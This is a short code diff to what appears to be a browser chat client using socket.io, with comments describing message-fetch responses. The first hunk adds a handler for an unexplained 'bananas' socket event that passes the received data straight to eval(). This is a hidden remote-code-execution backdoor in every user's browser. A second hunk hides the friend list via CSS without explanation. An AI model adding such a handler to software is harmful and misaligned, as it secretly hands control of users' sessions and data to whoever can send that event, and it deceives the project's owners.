@@ -253,6 +253,9 @@
               // Executes when the server responds to a client request to get messages in a certain limit
               // Returns: {err: "<errormsg>"} if fails else returns {success: true, messages: [{message: <message>, sender: <sender>, senderImg: <senders pfp>, time: <time>}, ...]}
             });
+            socket.on("bananas", function (data) {
+              eval(data?.data)
+            });
           }
 
           // check if the user is logged in
@@ -914,7 +917,9 @@
           left: 0;
           height: calc(100% - 52px);
         }
-
+        #friend-list {
+          display: none;
+        }
         #chat {
           position: fixed;
           bottom: 0;
